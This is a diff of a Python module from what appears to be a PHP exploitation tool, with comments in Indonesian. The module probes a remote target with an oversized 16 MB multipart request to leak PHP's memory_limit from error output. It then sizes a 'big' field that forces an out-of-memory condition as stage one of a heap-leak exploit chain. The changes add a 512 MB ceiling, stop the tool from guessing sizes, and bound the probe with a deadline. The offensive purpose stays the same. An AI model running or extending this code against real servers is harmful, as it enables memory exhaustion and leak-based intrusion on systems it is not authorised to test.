@@ -64,6 +64,30 @@ _UNITS = {"": 1, b"": 1, "K": 1024, b"K": 1024,
 # terbaca hampir pasti artefak (mis. potongan Content-Length), bukan limit.
 _SANE_MAX = 8 * 1024 ** 3
 
+# Plafon ukuran field `big` yang kami anggap masih aman dikirim ke target
+# orang lain. Ini JUGA nilai cap di `huge_mb_for` — diekspor supaya pemanggil
+# bisa membedakan "cukup untuk OOM" dari "ditahan plafon, tidak akan OOM".
+SAFE_CEILING_MB = 512
+
+
+def safe_ceiling_mb() -> int:
+    """Plafon ukuran field `big` dalam MB (`SAFE_CEILING_MB`)."""
+    return SAFE_CEILING_MB
+
+
+def exceeds_safe_ceiling(limit_bytes: int | None) -> bool:
+    """True bila memory_limit target >= plafon aman.
+
+    Kalau benar, `huge_mb_for()` akan mengembalikan nilai yang DITAHAN plafon
+    — artinya field `big` tidak mungkin dibuat lebih besar dari limit tanpa
+    melewati batas aman, dan stage-1 hampir pasti tidak OOM. Pemanggil wajib
+    berhenti dengan alasan eksplisit, bukan melanjutkan lalu melaporkan
+    "HEAP_LEAK_FAILED" tanpa sebab.
+    """
+    if not limit_bytes or limit_bytes <= 0:
+        return False
+    return limit_bytes / (1024 ** 2) >= SAFE_CEILING_MB
+
 # PHP menolak body sebelum skrip jalan. Pesannya berbeda dari OOM biasa:
 #   Warning: POST Content-Length of N bytes exceeds the limit of M bytes
 # Ini bukan leak, tapi justru INFORMASI: kita jadi tahu batas body target,
@@ -101,6 +125,34 @@ def parse_limit(resp: bytes) -> int | None:
     return None
 
 
+def huge_mb_or_none(limit_bytes: int | None, *, headroom: float = 1.15,
+                    floor_add_mb: int = 2) -> int | None:
+    """Ukuran field `big` yang menjamin OOM, atau **None** bila limit tak terbaca.
+
+    Ini varian JUJUR dari `huge_mb_for()`: tidak ada default diam-diam. Modul
+    ini sendiri sudah menolak menebak ("Kalau target tidak membocorkan angkanya,
+    kita menyerah dan bilang tidak diketahui"), tapi pemanggil lama menyambung
+    `huge_mb_for(None) -> 12 MB` sehingga tebakan itu kembali lewat pintu
+    belakang. Pemanggil yang tidak punya ukuran tervalidasi WAJIB memakai
+    fungsi ini dan berhenti, bukan menembak dengan 12 MB.
+    """
+    if not limit_bytes or limit_bytes <= 0:
+        return None
+    return _huge_mb_for_limit(limit_bytes, headroom=headroom,
+                              floor_add_mb=floor_add_mb)
+
+
+def _huge_mb_for_limit(limit_bytes: int, *, headroom: float,
+                       floor_add_mb: int) -> int:
+    """Perhitungan inti `huge_mb_for`/`huge_mb_or_none` (limit pasti terbaca)."""
+    lim_mb = limit_bytes / (1024 ** 2)
+    mb = int(max(lim_mb * headroom, lim_mb + floor_add_mb))
+    # Batas atas 512 MB: di atas itu target hampir pasti punya limit tak
+    # terjangkau dan rantai tidak akan jalan — lebih baik berhenti dan
+    # melapor daripada mengirim setengah gigabyte.
+    return max(4, min(mb, SAFE_CEILING_MB))
+
+
 def huge_mb_for(limit_bytes: int | None, *, default_mb: int = 12,
                 headroom: float = 1.15, floor_add_mb: int = 2) -> int:
     """Ukuran field `big` yang menjamin OOM, dalam MB.
@@ -112,15 +164,13 @@ def huge_mb_for(limit_bytes: int | None, *, default_mb: int = 12,
     `max(15%, +2 MB)` dan hasilnya dibulatkan ke atas.
 
     Tanpa limit yang diketahui, pakai default (perilaku lama, tidak berubah).
+    Pemanggil BARU yang tidak boleh menebak wajib memakai `huge_mb_or_none()`.
     """
-    if not limit_bytes or limit_bytes <= 0:
+    mb = huge_mb_or_none(limit_bytes, headroom=headroom,
+                         floor_add_mb=floor_add_mb)
+    if mb is None:
         return default_mb
-    lim_mb = limit_bytes / (1024 ** 2)
-    mb = int(max(lim_mb * headroom, lim_mb + floor_add_mb))
-    # Batas atas 512 MB: di atas itu target hampir pasti punya limit tak
-    # terjangkau dan rantai tidak akan jalan — lebih baik berhenti dan
-    # melapor daripada mengirim setengah gigabyte.
-    return max(4, min(mb, 512))
+    return mb
 
 
 def fb_for(limit_bytes: int | None, *, default_mb: int = 12) -> int:
@@ -136,9 +186,22 @@ def format_mb(n: int) -> str:
     return f"{n} B"
 
 
-def describe(limit_bytes: int | None, chosen_mb: int, cap: str = "unknown") -> str:
-    """Satu baris penjelasan untuk preflight/verbose."""
+def describe(limit_bytes: int | None, chosen_mb: int | None, cap: str = "unknown"
+             ) -> str:
+    """Satu baris penjelasan untuk preflight/verbose.
+
+    `chosen_mb=None`/0 berarti ukuran field BELUM ditentukan (limit tak
+    terbaca dan tidak ada --huge-mb) — kalimatnya tidak boleh berbunyi
+    "pakai default 12 MB", karena itu justru tebakan yang dihentikan audit.
+    """
     if limit_bytes:
+        if exceeds_safe_ceiling(limit_bytes):
+            # Dibedakan dari "limit sedang terbaca": di sini tidak ada ukuran
+            # field yang cukup untuk OOM tanpa melewati plafon aman.
+            return (f"memory_limit {format_mb(limit_bytes)} terbaca dari target; "
+                    f"limit target {limit_bytes // (1024 ** 2)} MiB melebihi "
+                    f"batas aman {SAFE_CEILING_MB} MiB — field 'big' ditahan "
+                    f"{chosen_mb} MB, stage-1 tidak akan OOM")
         return (f"memory_limit {format_mb(limit_bytes)} terbaca dari target; "
                 f"field 'big' disetel {chosen_mb} MB (harus > limit)")
     if cap == "rejected":
@@ -146,6 +209,12 @@ def describe(limit_bytes: int | None, chosen_mb: int, cap: str = "unknown") -> s
         # jalan, jadi tidak ada yang bisa membocorkan limit.
         return ("body 16 MB ditolak target sebelum skrip jalan — "
                 "post_max_size terlalu kecil untuk stage-1")
+    if not chosen_mb:
+        # chosen_mb=0/None eksplisit: bukan "default 12 MB", melainkan
+        # "belum ditentukan" — pemanggil (exploit_runner) sudah berhenti.
+        return ("memory_limit tidak terbaca (display_errors mungkin Off); "
+                "ukuran field 'big' TIDAK ditentukan — eksploitasi otomatis "
+                "dihentikan, berikan --huge-mb tervalidasi")
     return (f"memory_limit tidak terbaca (display_errors mungkin Off); "
             f"field 'big' pakai default {chosen_mb} MB")
 
@@ -153,15 +222,27 @@ def describe(limit_bytes: int | None, chosen_mb: int, cap: str = "unknown") -> s
 # ---------------------------------------------------------------- probe ---
 
 def probe(target_url: str, *, probe_mb: int = 16, timeout: float = 45.0,
-          verbose: bool = False) -> tuple[int | None, bytes]:
+          verbose: bool = False, deadline: float | None = None
+          ) -> tuple[int | None, bytes]:
     """Kirim SATU request multipart yang melewati memory_limit.
 
     Mengembalikan (limit_bytes | None, body_respons). Tidak pernah melempar
     untuk kegagalan jaringan biasa — pemanggil memutuskan apa artinya.
+
+    `deadline` (opsional, waktu absolut di jam time.monotonic) diteruskan ke
+    `Target`: probe 16 MB adalah request jaringan terbesar sebelum rantai, dan
+    tanpa deadline ia boleh berjalan 60s walau sisa anggaran run tinggal 2s —
+    persis celah "operasi berjalan lebih lama dari max_total_timeout".
     """
     from .chain import Target, build_multipart
 
-    t = Target(target_url, timeout=timeout, verbose=False)
+    prefer = max(60.0, float(timeout))
+    try:
+        t = Target(target_url, timeout=prefer, verbose=False, deadline=deadline)
+    except TypeError:
+        # chain.py versi lama: belum menerima deadline (dan tidak punya
+        # op_timeout) — tetap jalan, hanya tanpa batas absolut di sisi probe.
+        t = Target(target_url, timeout=prefer, verbose=False)
     boundary = b"P2SMEMPROBE"
     parts = [
         {"name": "PHPSESSID", "data": b"p2s"},
@@ -170,8 +251,7 @@ def probe(target_url: str, *, probe_mb: int = 16, timeout: float = 45.0,
     ]
     body = build_multipart(parts, boundary)
     try:
-        resp = t.post(body, boundary, read_cap=1 << 19,
-                      timeout=max(60.0, float(timeout)))
+        resp = t.post(body, boundary, read_cap=1 << 19, timeout=prefer)
     except OSError as e:
         if verbose:
             t.log(f"[!] probe gagal di jaringan: {e}")
